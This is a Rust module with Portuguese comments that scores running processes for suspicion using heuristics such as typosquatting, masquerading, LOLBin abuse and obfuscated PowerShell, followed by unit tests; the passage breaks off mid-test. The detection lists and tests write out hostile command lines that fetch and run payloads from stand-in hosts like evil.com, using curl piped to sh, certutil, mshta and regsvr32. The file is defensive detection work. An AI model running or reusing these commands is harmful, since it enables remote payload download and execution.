//! Heurísticas de detecção de processos suspeitos.
//!
//! Cada `check_*` recebe [`ProcessFacts`] e devolve `Option<Finding>`.
//! [`analyze`] roda todas, soma pesos, trunca em [`MAX_SCORE`] e decide
//! [`Severity`].
//!
//! Sem I/O, sem estado. Toda parametrização que dependa de ambiente
//! (pesos configuráveis, heurísticas liga/desliga) entra em Fase 8.

use super::mitre::{self, Technique};
use super::types::{Finding, FindingKind, MAX_SCORE, ProcessFacts, Severity, SuspicionReport};

/// Analisa um processo e devolve score + findings.
///
/// Cada heurística retorna no máximo 1 finding — não empilha por
/// sub-padrão (ex.: múltiplas needles na mesma cmdline valem só um
/// `SuspiciousCmdline`).
pub fn analyze(facts: &ProcessFacts<'_>) -> SuspicionReport {
    let mut findings = Vec::new();

    if let Some(f) = check_temp_dir(facts) {
        findings.push(f);
    }
    if let Some(f) = check_typosquatting(facts) {
        findings.push(f);
    }
    if let Some(f) = check_masquerade_location(facts) {
        findings.push(f);
    }
    if let Some(f) = check_suspicious_parent(facts) {
        findings.push(f);
    }
    if let Some(f) = check_suspicious_cmdline(facts) {
        findings.push(f);
    }
    if let Some(f) = check_lolbin(facts) {
        findings.push(f);
    }
    if let Some(f) = check_obfuscated_powershell(facts) {
        findings.push(f);
    }
    if let Some(f) = check_hidden_executable(facts) {
        findings.push(f);
    }
    if let Some(f) = check_user_writable_location(facts) {
        findings.push(f);
    }
    if facts.cpu_sustained_high {
        findings.push(Finding::new(
            FindingKind::CpuSustainedHigh,
            "uso de CPU sustentadamente alto",
        ));
    }

    let raw: u32 = findings.iter().map(|f| f.weight as u32).sum();
    let score = raw.min(MAX_SCORE as u32) as u8;

    SuspicionReport {
        score,
        severity: Severity::from_score(score),
        findings,
    }
}

// ---------------------------------------------------------------------------
// Heurísticas individuais
// ---------------------------------------------------------------------------

/// Executável em diretório temporário clássico.
fn check_temp_dir(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let path = facts.exe_path?;
    let norm = path.replace('\\', "/").to_ascii_lowercase();

    // Segmentos exatos — evita casar com "C:/TempFiles" ou "/tmpfoo".
    const NEEDLES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/", "/appdata/local/temp/"];

    let is_temp = NEEDLES.iter().any(|s| norm.contains(s))
        || norm.ends_with("/tmp")
        || norm.ends_with("/dev/shm")
        || norm.ends_with("/var/tmp")
        || norm.ends_with("/appdata/local/temp");

    if is_temp {
        Some(Finding::new(
            FindingKind::TempDir,
            format!("executável em diretório temporário: {path}"),
        ))
    } else {
        None
    }
}

/// Nome muito parecido com binário conhecido do SO (troca, omissão,
/// inserção ou substituição de 1-2 caracteres).
fn check_typosquatting(facts: &ProcessFacts<'_>) -> Option<Finding> {
    if let Some(path) = facts.exe_path
        && is_canonical_system_dir(path)
    {
        return None;
    }

    let stem = strip_ext(facts.name).to_ascii_lowercase();
    if stem.len() < 4 {
        return None;
    }

    const SYSTEM_NAMES: &[&str] = &[
        // Windows — inclui nomes "curtos" que dão falso-positivo entre si
        "svchost",
        "csrss",
        "winlogon",
        "lsass",
        "lsaiso",
        "services",
        "wininit",
        "smss",
        "explorer",
        "taskhostw",
        "runtimebroker",
        "conhost",
        "dwm",
        "spoolsv",
        "system",
        "sihost",
        "ngciso",
        // Unix
        "init",
        "systemd",
        "bash",
        "sshd",
        "cron",
        "crond",
        "sudo",
        "login",
        "passwd",
        // macOS
        "launchd",
    ];

    let limit = if stem.len() >= 6 { 2 } else { 1 };

    // Match exato com QUALQUER nome conhecido → é legítimo, não
    // typosquat. Precisa varrer a lista inteira ANTES do loop de
    // near-match: `lsaiso` é prefixo próximo de `lsass`, e sem essa
    // pré-checagem o `lsass` (que vem antes no array) dispara primeiro.
    if SYSTEM_NAMES.iter().any(|n| stem == *n) {
        return None;
    }

    for candidate in SYSTEM_NAMES {
        let dist = levenshtein(&stem, candidate);
        let len_diff = (stem.len() as i32 - candidate.len() as i32).abs();
        if dist <= limit && len_diff <= 1 {
            return Some(Finding::new(
                FindingKind::Typosquatting,
                format!(
                    "\"{}\" a {} edição(ões) de \"{}\"",
                    facts.name, dist, candidate
                ),
            ));
        }
    }
    None
}

/// `true` se o caminho está num diretório canônico do SO, onde binários
/// legítimos vivem. Typosquatting fora daqui continua detectado.
fn is_canonical_system_dir(path: &str) -> bool {
    let norm = path.replace('\\', "/").to_ascii_lowercase();
    const PREFIXES: &[&str] = &[
        // Windows
        "c:/windows/system32/",
        "c:/windows/syswow64/",
        "c:/windows/winsxs/",
        "c:/windows/",
        // Linux
        "/usr/bin/",
        "/usr/sbin/",
        "/bin/",
        "/sbin/",
        "/usr/libexec/",
        // macOS
        "/system/library/",
        "/usr/libexec/",
    ];
    PREFIXES.iter().any(|p| norm.starts_with(p))
}

/// Processo com nome canônico do sistema (ex.: `svchost.exe`) rodando
/// FORA de `System32`/`SysWOW64`.
///
/// Padrão #1 de malware Windows. Match exato no nome + path não-canônico.
/// NÃO conflita com typosquatting: aqui o nome é idêntico ao legítimo,
/// só o diretório trai.
fn check_masquerade_location(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let path = facts.exe_path?;
    if is_canonical_system_dir(path) {
        return None;
    }

    let stem = strip_ext(facts.name).to_ascii_lowercase();

    // Só nomes que SÓ existem em dir do sistema. Fora daí é anômalo.
    // Lista conservadora — exclui `explorer`, `dllhost`, `taskhostw`,
    // `runtimebroker`, `conhost` porque vivem em outros paths também.
    const CRITICAL_NAMES: &[&str] = &[
        "svchost", "lsass", "lsaiso", "services", "csrss", "wininit", "winlogon", "smss",
        "spoolsv", "ngciso",
        // Unix (em /usr/sbin, /sbin — se aparecer fora, é suspeito)
        "systemd", "sshd", "cron", "crond",
    ];

    if CRITICAL_NAMES.iter().any(|n| stem == *n) {
        return Some(Finding::new(
            FindingKind::MasqueradeLocation,
            format!(
                "\"{}\" (binário de sistema) rodando de fora do diretório canônico: {path}",
                facts.name
            ),
        ));
    }

    None
}

/// Cadeia pai→filho que historicamente indica execução maliciosa.
fn check_suspicious_parent(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let parent_raw = facts.parent_name?;
    let parent = strip_ext(parent_raw).to_ascii_lowercase();
    let child = strip_ext(facts.name).to_ascii_lowercase();

    /// Shells/filhos que nunca deveriam aparecer como filho destes pais.
    const SHELL_CHILDREN: &[&str] = &[
        "cmd",
        "powershell",
        "pwsh",
        "wscript",
        "cscript",
        "mshta",
        "bash",
        "sh",
    ];

    /// Lista de pais cujo spawn de shell é (praticamente) sempre malicioso.
    ///
    /// **NÃO inclui `explorer.exe`**: `explorer → cmd` é comum quando o
    /// usuário escolhe "Abrir Prompt de Comando Aqui". Falso-positivo alto.
    const SUSPICIOUS_PARENTS: &[&str] = &[
        // Office (macro maliciosa clássica)
        "winword",
        "excel",
        "powerpnt",
        "outlook",
        "msaccess",
        // Navegador (exploit de renderer)
        "chrome",
        "firefox",
        "msedge",
        "brave",
        // Servidor web (web shell / RCE)
        "nginx",
        "httpd",
        "apache2",
        "php-fpm",
        // Leitores de PDF
        "acrobat",
        "acrord32",
        "foxitreader",
        "sumatrapdf",
        // Office alternativo
        "soffice",
        "libreoffice",
        // Mídia
        "vlc",
        "mpv",
        "wmplayer",
        // Chat / colaboração
        "teams",
        "slack",
        "discord",
        "zoom",
        "telegram",
    ];

    if SUSPICIOUS_PARENTS.contains(&parent.as_str()) && SHELL_CHILDREN.contains(&child.as_str()) {
        return Some(Finding::new(
            FindingKind::SuspiciousParent,
            format!("cadeia suspeita: {parent_raw} → {}", facts.name),
        ));
    }

    None
}

/// Padrões conhecidos de ofuscação / download / execução em cmdline.
///
/// Regras específicas de LOLBin têm seu próprio `check_lolbin` (peso
/// maior) — aqui ficam só padrões genéricos de cmdline.
fn check_suspicious_cmdline(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let cl = facts.cmdline;
    if cl.trim().is_empty() {
        return None;
    }
    let lc = cl.to_ascii_lowercase();

    const NEEDLES: &[(&str, &str, Technique)] = &[
        (
            "-encodedcommand",
            "PowerShell -EncodedCommand",
            mitre::POWERSHELL,
        ),
        ("-enc ", "PowerShell -Enc", mitre::POWERSHELL),
        (
            "invoke-expression",
            "PowerShell Invoke-Expression",
            mitre::POWERSHELL,
        ),
        ("iex(", "PowerShell IEX", mitre::POWERSHELL),
        ("iex (", "PowerShell IEX", mitre::POWERSHELL),
        (
            "downloadstring(",
            "download de payload via .NET",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "downloadfile(",
            "download de payload via .NET",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "frombase64string(",
            "decodificação Base64 em memória",
            mitre::DEOBFUSCATE_DECODE,
        ),
        (
            "mshta javascript:",
            "mshta com JavaScript",
            mitre::WINDOWS_COMMAND_SHELL,
        ),
        (
            "mshta http",
            "mshta baixando payload remoto",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "rundll32 javascript:",
            "rundll32 executando JavaScript",
            mitre::WINDOWS_COMMAND_SHELL,
        ),
        (
            "certutil -urlcache",
            "certutil baixando payload",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "certutil -decode",
            "certutil decodificando arquivo",
            mitre::DEOBFUSCATE_DECODE,
        ),
        (
            "nc -e",
            "netcat com execução (-e)",
            mitre::NON_APP_LAYER_PROTOCOL,
        ),
        (
            "ncat -e",
            "ncat com execução (-e)",
            mitre::NON_APP_LAYER_PROTOCOL,
        ),
        (
            "/dev/tcp/",
            "redirect TCP via /dev/tcp",
            mitre::NON_APP_LAYER_PROTOCOL,
        ),
    ];

    for (needle, label, tech) in NEEDLES {
        if lc.contains(needle) {
            return Some(Finding::with_technique(
                FindingKind::SuspiciousCmdline,
                format!("linha de comando suspeita: {label}"),
                *tech,
            ));
        }
    }

    // Cadeia "curl ... | sh" (download seguido de execução por pipe).
    let has_downloader = lc.contains("curl ") || lc.contains("wget ");
    let has_pipe_shell = lc.contains("| sh")
        || lc.contains("|sh")
        || lc.contains("| bash")
        || lc.contains("|bash")
        || lc.contains("| zsh")
        || lc.contains("|zsh");

    if has_downloader && has_pipe_shell {
        return Some(Finding::with_technique(
            FindingKind::SuspiciousCmdline,
            "download seguido de execução por pipe para shell",
            mitre::INGRESS_TOOL_TRANSFER,
        ));
    }

    None
}

/// Binário nativo do Windows abusado como proxy (LOLBin — Living Off
/// the Land Binaries).
///
/// Assinatura: nome do processo bate EXATAMENTE com o binário conhecido
/// E a cmdline contém um dos padrões abusivos. Peso 35 (Defense Evasion).
///
/// Combina com `check_suspicious_cmdline` (peso 30): quando ambos disparam,
/// o processo soma 65 — sinal forte de ataque real.
fn check_lolbin(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let cl = facts.cmdline;
    if cl.trim().is_empty() {
        return None;
    }

    let stem = strip_ext(facts.name).to_ascii_lowercase();
    let lc = cl.to_ascii_lowercase();

    // (nome do binário, needles abusivas, descrição)
    const RULES: &[(&str, &[&str], &str)] = &[
        (
            "certutil",
            &["-urlcache", "-decode", "-encode", "-ping -n"],
            "certutil abusado para download/decode",
        ),
        (
            "bitsadmin",
            &["/transfer", "/addfile", "/setnotifycmdline", "/create"],
            "bitsadmin usado para transferência de payload",
        ),
        (
            "mshta",
            &["http", "javascript:", "vbscript:", "about:"],
            "mshta executando conteúdo remoto ou script inline",
        ),
        (
            "rundll32",
            &[
                "javascript:",
                "http://",
                "https://",
                "url.dll,fileprotocolhandler",
            ],
            "rundll32 executando JavaScript ou URL remota",
        ),
        (
            "regsvr32",
            &["/i:http", "/i:ftp", "/i:https", "/s /u /i:"],
            "regsvr32 com Scriptlet remoto (Squiblydoo)",
        ),
        (
            "wmic",
            &["process call create", "os get", "shadowcopy delete"],
            "wmic usado para execução lateral ou destruição",
        ),
        (
            "installutil",
            &["/u ", "/logfile=", "/logtoconsole"],
            "installutil abusado (bypass de AppLocker)",
        ),
        (
            "msbuild",
            &["<inlinetask", "<usingtask"],
            "msbuild com InlineTask (execução de código inline)",
        ),
    ];

    for (bin, needles, label) in RULES {
        if stem != *bin {
            continue;
        }
        for needle in *needles {
            if lc.contains(needle) {
                return Some(Finding::with_technique(
                    FindingKind::LolBin,
                    format!("LOLBin: {} — {}", facts.name, label),
                    mitre::SYSTEM_BINARY_PROXY,
                ));
            }
        }
    }

    None
}

/// Combo de flags de obfuscação em PowerShell.
///
/// Dispara quando: (a) processo é powershell/pwsh, (b) **não** contém
/// `-enc`/`-EncodedCommand` (senão `SuspiciousCmdline` já pega), e
/// (c) soma de flags suspeitas ≥3, com pelo menos 1 "forte" (`-w hidden`
/// ou `-ep bypass`).
///
/// Alternativa: cmdline contém string base64-lookalike ≥100 chars
/// `[A-Za-z0-9+=]` — comum em payload embutido.
fn check_obfuscated_powershell(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let cl = facts.cmdline;
    if cl.trim().is_empty() {
        return None;
    }
    let lc = cl.to_ascii_lowercase();

    let stem = strip_ext(facts.name).to_ascii_lowercase();
    if stem != "powershell" && stem != "pwsh" {
        return None;
    }

    // Se tem -EncodedCommand/-enc/-ec, `SuspiciousCmdline` já sinaliza.
    // Evita finding duplicado.
    let has_encoded = lc.contains("-encodedcommand") || lc.contains("-enc ") || lc.contains("-ec ");
    if has_encoded {
        return None;
    }

    const STRONG: &[&str] = &[
        "-w hidden",
        "-windowstyle hidden",
        "-ep bypass",
        "-executionpolicy bypass",
    ];
    const WEAK: &[&str] = &[
        "-nop",
        "-noprofile",
        "-sta",
        "-noninteractive",
        "-noni",
        "-bypass",
    ];

    let strong = STRONG.iter().filter(|s| lc.contains(*s)).count();
    let weak = WEAK.iter().filter(|s| lc.contains(*s)).count();

    if strong >= 1 && strong + weak >= 3 {
        return Some(Finding::with_technique(
            FindingKind::ObfuscatedCommand,
            format!(
                "PowerShell com {} flags de obfuscação ({} forte(s) + {} fraca(s))",
                strong + weak,
                strong,
                weak
            ),
            mitre::OBFUSCATED_FILES,
        ));
    }

    // Base64-lookalike ≥100 chars (payload inline).
    if let Some(n) = longest_b64_run(cl)
        && n >= 100
    {
        return Some(Finding::with_technique(
            FindingKind::ObfuscatedCommand,
            format!("string base64 longa ({n} chars) na cmdline"),
            mitre::DEOBFUSCATE_DECODE,
        ));
    }

    None
}

/// Maior sequência de chars `[A-Za-z0-9+=]` na string. Exclui `/` de
/// propósito (paths de arquivo). >=100 chars é praticamente só base64.
fn longest_b64_run(s: &str) -> Option<usize> {
    let mut run = 0usize;
    let mut best = 0usize;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '=' {
            run += 1;
            best = best.max(run);
        } else {
            run = 0;
        }
    }
    if best == 0 { None } else { Some(best) }
}

/// Nome de arquivo com truques de engenharia social / Unicode.
fn check_hidden_executable(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let name = facts.name;

    // RTL override (U+202E) — inverte visualmente a extensão.
    if name.contains('\u{202E}') {
        return Some(Finding::new(
            FindingKind::HiddenExecutable,
            "nome contém RTL override (U+202E)",
        ));
    }

    let lc = name.to_ascii_lowercase();

    // Extensão dupla enganosa: "foto.jpg.exe", "nota.pdf.exe", ...
    const DECOYS: &[&str] = &[
        ".pdf.exe",
        ".doc.exe",
        ".docx.exe",
        ".xls.exe",
        ".xlsx.exe",
        ".jpg.exe",
        ".jpeg.exe",
        ".png.exe",
        ".gif.exe",
        ".txt.exe",
        ".zip.exe",
        ".rar.exe",
        ".mp3.exe",
        ".mp4.exe",
        ".avi.exe",
    ];
    for d in DECOYS {
        if lc.ends_with(d) {
            return Some(Finding::new(
                FindingKind::HiddenExecutable,
                format!("extensão dupla enganosa: {name}"),
            ));
        }
    }

    // Espaço antes da extensão (Windows ignora silenciosamente).
    for ext in [".exe", ".com", ".bat", ".cmd", ".scr", ".ps1"] {
        let needle = format!(" {ext}");
        if lc.ends_with(&needle) {
            return Some(Finding::new(
                FindingKind::HiddenExecutable,
                format!("espaço antes da extensão: {name}"),
            ));
        }
    }

    None
}

/// Executável em pasta de usuário onde binários não deveriam rodar.
fn check_user_writable_location(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let path = facts.exe_path?;
    let norm = path.replace('\\', "/").to_ascii_lowercase();

    const NEEDLES: &[&str] = &[
        "/downloads/",
        "/desktop/",
        "/documents/",
        "/onedrive/",
        "/public/",
    ];

    for n in NEEDLES {
        if norm.contains(n) {
            return Some(Finding::new(
                FindingKind::UserWritableLocation,
                format!("executável em pasta de usuário: {path}"),
            ));
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Utilidades
// ---------------------------------------------------------------------------

/// Remove a última extensão de um nome (`nota.pdf.exe` → `nota.pdf`).
/// Sem ponto ou ponto na posição 0 → devolve o original.
pub(super) fn strip_ext(name: &str) -> &str {
    match name.rfind('.') {
        Some(i) if i > 0 => &name[..i],
        _ => name,
    }
}

/// Distância de Levenshtein (número mínimo de edições).
/// O(n*m) com duas linhas — suficiente para nomes de binários.
fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (n, m) = (a.len(), b.len());

    if n == 0 {
        return m;
    }
    if m == 0 {
        return n;
    }

    let mut prev: Vec<usize> = (0..=m).collect();
    let mut curr = vec![0usize; m + 1];

    for i in 1..=n {
        curr[0] = i;
        for j in 1..=m {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            curr[j] = (prev[j] + 1).min(curr[j - 1] + 1).min(prev[j - 1] + cost);
        }
        std::mem::swap(&mut prev, &mut curr);
    }

    prev[m]
}

// ---------------------------------------------------------------------------
// Testes
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper para montar fatos com o mínimo de ruído nos testes.
    fn facts<'a>(
        name: &'a str,
        exe: Option<&'a str>,
        cmd: &'a str,
        parent: Option<&'a str>,
    ) -> ProcessFacts<'a> {
        ProcessFacts {
            pid: 1234,
            parent_pid: None,
            name,
            exe_path: exe,
            cmdline: cmd,
            parent_name: parent,
            user: None,
            cpu_sustained_high: false,
        }
    }

    #[test]
    fn clean_process_scores_zero() {
        let f = facts(
            "explorer.exe",
            Some(r"C:\Windows\explorer.exe"),
            "",
            Some("userinit.exe"),
        );
        let r = analyze(&f);
        assert_eq!(r.score, 0);
        assert_eq!(r.severity, Severity::Clean);
        assert!(r.is_clean());
    }

    #[test]
    fn levenshtein_basic() {
        assert_eq!(levenshtein("svchost", "svchost"), 0);
        assert_eq!(levenshtein("scvhost", "svchost"), 2); // transposição
        assert_eq!(levenshtein("svchost", "svchosts"), 1);
        assert_eq!(levenshtein("", "abc"), 3);
        assert_eq!(levenshtein("abc", ""), 3);
    }

    #[test]
    fn typosquatting_suppressed_in_system32() {
        // sihost.exe legítimo do Windows — fica em System32.
        let f = facts(
            "sihost.exe",
            Some(r"C:\Windows\System32\sihost.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::Typosquatting)
        );
    }

    #[test]
    fn system_kernel_process_not_typosquat() {
        // "System" (PID 4) não tem path e não é typosquat de "systemd".
        let f = facts("System", None, "", None);
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::Typosquatting)
        );
    }

    #[test]
    fn typosquatting_maps_to_masquerading_technique() {
        let f = facts(
            "scvhost.exe",
            Some(r"C:\Users\u\AppData\Local\Temp\scvhost.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        let t = r
            .findings
            .iter()
            .find(|f| f.kind == FindingKind::Typosquatting)
            .expect("typosquatting should fire");
        assert_eq!(t.technique, Some(mitre::MASQUERADING_NAME_OR_LOCATION));
    }

    #[test]
    fn exact_match_with_earlier_short_name_does_not_fire() {
        // lsaiso casa exato com "lsaiso" na lista; não pode disparar
        // como typosquat de "lsass" (que vem antes no array).
        let f = facts("LsaIso.exe", None, "", None);
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::Typosquatting)
        );
    }

    #[test]
    fn temp_dir_no_false_positive() {
        let f = facts("app.exe", Some(r"C:\Apps\Temperature\app.exe"), "", None);
        let r = analyze(&f);
        assert!(!r.findings.iter().any(|x| x.kind == FindingKind::TempDir));
    }

    #[test]
    fn office_spawning_shell_flagged() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "powershell -nop -w hidden -EncodedCommand SQBFAFgA",
            Some("winword.exe"),
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::SuspiciousParent));
        assert!(kinds.contains(&FindingKind::SuspiciousCmdline));
        assert_eq!(r.score, 65);
        assert_eq!(r.severity, Severity::Suspicious);
    }

    #[test]
    fn suspicious_cmdline_maps_to_powershell_technique() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "powershell -nop -EncodedCommand SQBFAFgA",
            Some("explorer.exe"),
        );
        let r = analyze(&f);
        let cmd = r
            .findings
            .iter()
            .find(|f| f.kind == FindingKind::SuspiciousCmdline)
            .expect("cmdline finding should fire");
        assert_eq!(cmd.technique, Some(mitre::POWERSHELL));
    }

    #[test]
    fn download_pipe_shell_detected() {
        let f = facts(
            "sh",
            Some("/bin/sh"),
            "curl http://evil.example/p | sh",
            Some("nginx"),
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::SuspiciousParent));
        assert!(kinds.contains(&FindingKind::SuspiciousCmdline));
    }

    #[test]
    fn double_extension_detected() {
        let f = facts(
            "nota.pdf.exe",
            Some(r"C:\Users\u\Downloads\nota.pdf.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::HiddenExecutable));
        assert!(kinds.contains(&FindingKind::UserWritableLocation));
        assert_eq!(r.score, 40);
        assert_eq!(r.severity, Severity::Attention);
    }

    #[test]
    fn rtl_override_detected() {
        let f = facts("foto\u{202E}gpj.exe", None, "", None);
        let r = analyze(&f);
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::HiddenExecutable)
        );
    }

    #[test]
    fn score_capped_at_100() {
        let f = ProcessFacts {
            pid: 9999,
            parent_pid: Some(100),
            name: "scvhost.exe",
            exe_path: Some(r"C:\Users\u\Downloads\scvhost.exe"),
            cmdline: "powershell -enc SQBFAFgA",
            parent_name: Some("winword.exe"),
            user: None,
            cpu_sustained_high: true,
        };
        let r = analyze(&f);
        assert_eq!(r.score, 100);
        assert_eq!(r.severity, Severity::Critical);
    }

    #[test]
    fn severity_thresholds() {
        assert_eq!(Severity::from_score(0), Severity::Clean);
        assert_eq!(Severity::from_score(19), Severity::Clean);
        assert_eq!(Severity::from_score(20), Severity::Attention);
        assert_eq!(Severity::from_score(49), Severity::Attention);
        assert_eq!(Severity::from_score(50), Severity::Suspicious);
        assert_eq!(Severity::from_score(79), Severity::Suspicious);
        assert_eq!(Severity::from_score(80), Severity::Critical);
        assert_eq!(Severity::from_score(100), Severity::Critical);
    }

    // --- Bloco A: MasqueradeLocation -------------------------------------

    #[test]
    fn masquerade_svchost_outside_system32_flagged() {
        let f = facts(
            "svchost.exe",
            Some(r"C:\Users\u\AppData\Local\Temp\svchost.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        let f = r
            .findings
            .iter()
            .find(|x| x.kind == FindingKind::MasqueradeLocation)
            .expect("masquerade should fire");
        assert_eq!(f.weight, 45);
        assert_eq!(f.technique, Some(mitre::MASQUERADING_NAME_OR_LOCATION));
    }

    #[test]
    fn masquerade_svchost_in_system32_clean() {
        let f = facts(
            "svchost.exe",
            Some(r"C:\Windows\System32\svchost.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::MasqueradeLocation)
        );
    }

    #[test]
    fn masquerade_unknown_name_ignored() {
        let f = facts(
            "myapp.exe",
            Some(r"C:\Users\u\AppData\Local\Temp\myapp.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::MasqueradeLocation)
        );
    }

    // --- Bloco B: LolBin --------------------------------------------------

    #[test]
    fn lolbin_certutil_urlcache_flagged() {
        let f = facts(
            "certutil.exe",
            Some(r"C:\Windows\System32\certutil.exe"),
            "certutil -urlcache -f http://evil.com/x.exe out.exe",
            None,
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::LolBin));
        assert!(kinds.contains(&FindingKind::SuspiciousCmdline)); // sinal duplo
        assert_eq!(r.score, 65); // 35 (LolBin) + 30 (SuspiciousCmdline)
    }

    #[test]
    fn lolbin_certutil_benign_no_flag() {
        let f = facts(
            "certutil.exe",
            Some(r"C:\Windows\System32\certutil.exe"),
            "certutil -dump",
            None,
        );
        let r = analyze(&f);
        assert!(!r.findings.iter().any(|x| x.kind == FindingKind::LolBin));
    }

    #[test]
    fn lolbin_mshta_remote_flagged() {
        let f = facts(
            "mshta.exe",
            Some(r"C:\Windows\System32\mshta.exe"),
            "mshta http://evil.com/payload.hta",
            None,
        );
        let r = analyze(&f);
        assert!(r.findings.iter().any(|x| x.kind == FindingKind::LolBin));
    }

    #[test]
    fn lolbin_regsvr32_squiblydoo_flagged() {
        let f = facts(
            "regsvr32.exe",
            Some(r"C:\Windows\System32\regsvr32.exe"),
            r"regsvr32 /s /u /i:http://evil.com/x.sct scrobj.dll",
            None,
        );
        let r = analyze(&f);
        assert!(r.findings.iter().any(|x| x.kind == FindingKind::LolBin));
    }

    #[test]
    fn lolbin_msbuild_inline_task_flagged() {
        let f = facts(
            "MSBuild.exe",
            Some(r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"),
            "MSBuild.exe evil.proj.xml",
            None,
        );
        // Sem <InlineTask não dispara. Aqui testamos o positivo:
        let f = ProcessFacts {
            cmdline: "MSBuild.exe -p:Configuration=Release proj.xml <InlineTask />",
            ..f
        };
        let r = analyze(&f);
        assert!(r.findings.iter().any(|x| x.kind == FindingKind::LolBin));
    }

    // --- Bloco C: pais estendidos ----------------------------------------

    #[test]
    fn acrobat_reader_spawning_shell_flagged() {
        let f = facts(
            "cmd.exe",
            Some(r"C:\Windows\System32\cmd.exe"),
            "",
            Some("AcroRd32.exe"),
        );
        let r = analyze(&f);
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::SuspiciousParent)
        );
    }

    #[test]
    fn discord_spawning_powershell_flagged() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "",
            Some("Discord.exe"),
        );
        let r = analyze(&f);
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::SuspiciousParent)
        );
    }

    #[test]
    fn explorer_spawning_cmd_not_flagged() {
        // explorer → cmd é comum (Shift+Click "Abrir prompt aqui").
        let f = facts(
            "cmd.exe",
            Some(r"C:\Windows\System32\cmd.exe"),
            "",
            Some("explorer.exe"),
        );
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::SuspiciousParent)
        );
    }

    // --- Bloco D: combo PS obfuscação ------------------------------------

    #[test]
    fn obfuscated_powershell_combo_flagged() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            r#"powershell -w hidden -nop -ep bypass -c "whoami""#,
            None,
        );
        let r = analyze(&f);
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::ObfuscatedCommand)
        );
    }

    #[test]
    fn obfuscated_powershell_single_flag_not_flagged() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "powershell -w hidden script.ps1",
            None,
        );
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::ObfuscatedCommand)
        );
    }

    #[test]
    fn obfuscated_powershell_skips_when_encoded() {
        // -EncodedCommand já vira SuspiciousCmdline; combo não duplica.
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "powershell -w hidden -nop -ep bypass -EncodedCommand SQBFAFgA",
            None,
        );
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
                .any(|x| x.kind == FindingKind::ObfuscatedCommand)
        );
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::SuspiciousCmdline)
        );
    }

    #[test]
    fn obfuscated_powershell_long_b64_flagged() {
        let b64 = "A".repeat(150);
        let cmd = format!("powershell -c \"IEX('{b64}')\"");
        let f = ProcessFacts {
            pid: 1,
            parent_pid: None,
            name: "powershell.exe",
            exe_path: Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            cmdline: &cmd,
            parent_name: None,
            user: None,
            cpu_sustained_high: false,
        };
        let r = analyze(&f);
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::ObfuscatedCommand)
        );
    }

    #[test]
    fn obfuscated_not_applied_to_non_powershell() {
        let b64 = "A".repeat(150);
        let cmd = format!("bash -c 'echo {b64}'");
        let f = ProcessFacts {
            pid: 1,
            parent_pid: None,
            name: "bash",
            exe_path: Some("/bin/bash"),
            cmdline: &cmd,
            parent_name: None,
            user: None,
            cpu_sustained_high: false,
        };
        let r = analyze(&f);
        assert!(
            !r.findings
                .iter()
